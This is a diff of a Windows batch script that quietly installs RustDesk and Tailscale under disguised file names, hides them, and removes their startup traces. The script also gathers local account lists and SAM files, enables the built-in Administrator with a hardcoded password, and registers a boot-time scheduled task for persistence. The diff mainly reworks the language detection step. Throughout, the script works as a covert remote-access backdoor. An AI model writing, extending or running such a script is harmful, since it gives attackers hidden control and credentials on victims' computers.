@@ -12,39 +12,39 @@ if exist C:\Temp\Dcp9-s.ps1 (
   cd C:\Temp\
   cls
 ) else (
-  mkdir C:\Temp\
-  cls
-  del ID\RustID.txt.back
-  cls
-  del ID\AccountList.txt.back
-  cls
-  del ID\NetUserFR.txt.back
-  cls
-  del ID\NetUserEN.txt.back
-  cls
-  del ID\SAM.back
-  cls
-  move ID\RustID.txt ID\RustID.txt.back
-  cls
-  move ID\AccountList.txt ID\AccountList.txt.back
-  cls
-  move ID\NetUserFR.txt ID\NetUserFR.txt.back
-  cls
-  move ID\NetUserEN.txt ID\NetUserEN.txt.back
-  cls
-  move ID\SAM ID\SAM.back
-  cls
-  copy RustInstallDesk.ps1 C:\Temp\Dcp9-s.ps1
-  cls
-  copy rustdesk.exe C:\Temp\Cda8-s.exe
-  cls
-  copy HideRustScale.ps1 C:\Temp\Cde8-s.ps1
-  cls
-  copy RustPass.txt C:\Temp\Yid9-p.txt
-  cls
-  copy tailscale.msi C:\Temp\Tda8_s.msi
-  cls
-  copy Edge_Runner_Esc.cmd C:\Temp\odp_z.lnk
+    mkdir C:\Temp\
+    cls
+    del ID\RustID.txt.back
+    cls
+    del ID\AccountList.txt.back
+    cls
+    del ID\NetUserFR.txt.back
+    cls
+    del ID\NetUserEN.txt.back
+    cls
+    del ID\SAM.back
+    cls
+    move ID\RustID.txt ID\RustID.txt.back
+    cls
+    move ID\AccountList.txt ID\AccountList.txt.back
+    cls
+    move ID\NetUserFR.txt ID\NetUserFR.txt.back
+    cls
+    move ID\NetUserEN.txt ID\NetUserEN.txt.back
+    cls
+    move ID\SAM ID\SAM.back
+    cls
+    copy RustInstallDesk.ps1 C:\Temp\Dcp9-s.ps1
+    cls
+    copy rustdesk.exe C:\Temp\Cda8-s.exe
+    cls
+    copy HideRustScale.ps1 C:\Temp\Cde8-s.ps1
+    cls
+    copy RustPass.txt C:\Temp\Yid9-p.txt
+    cls
+    copy tailscale.msi C:\Temp\Tda8_s.msi
+    cls
+    copy Edge_Runner_Esc.cmd C:\Temp\odp_z.lnk
 )
 cls
 
@@ -74,9 +74,17 @@ REM --> Getting Admin
     pushd "%CD%"
     CD /D "%~dp0"
 
+
+
 cls
-REM			------> Get local User list
+REM			------> Get local User list + Lang Check
 wmic UserAccount where "LocalAccount=True" get Name | C:\Windows\System32\findstr.exe /v /c:"Name" /c:"é" /c:"à" /c:"ù" /c:"è" > ID\AccountList.txt
+cls
+net user > C:\Temp\idc_9.txt
+cls
+find /i "Administrateur" C:\Temp\idc_9.txt && ( set lang=FR )
+cls
+find /i "Administrator" C:\Temp\idc_9.txt && ( set lang=EN )
 cls
 REM			-----> Install RustDesk (Note that it makes a Toast when installed, don't know how to disable this)
 PowerShell -ExecutionPolicy Bypass -File C:\Temp\Dcp9-s.ps1
@@ -133,16 +141,13 @@ cls
 del /f "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Tailscale.lnk"
 cls
 REM			-----> Admin Magic (Admin active + password)
-find "Administrateur" ID\AccountList.txt && ( set lang=FR )
-cls
-find "Administrator" ID\AccountList.txt && ( set lang=EN )
-cls
 if %lang%==FR ( goto AdminFr )
 cls
 if %lang%==EN ( goto AdminEn )
 cls
+
 :AdminFr
-	cls
+  cls
 	net user Administrateur /active:yes
 	cls
 	net user Administrateur CoucouWas-hereAdmin
@@ -164,7 +169,10 @@ cls
 	cls
 
 :SkipLang
+  cls
+  del C:\Temp\idc_9.txt
 	cls
+
 REM			-----> Planned Tasks
 SCHTASKS /CREATE /MO ONSTART /TN "Edge_Runner" /TR "C:\Windows\System32\Edge_Runner.cmd"
 cls
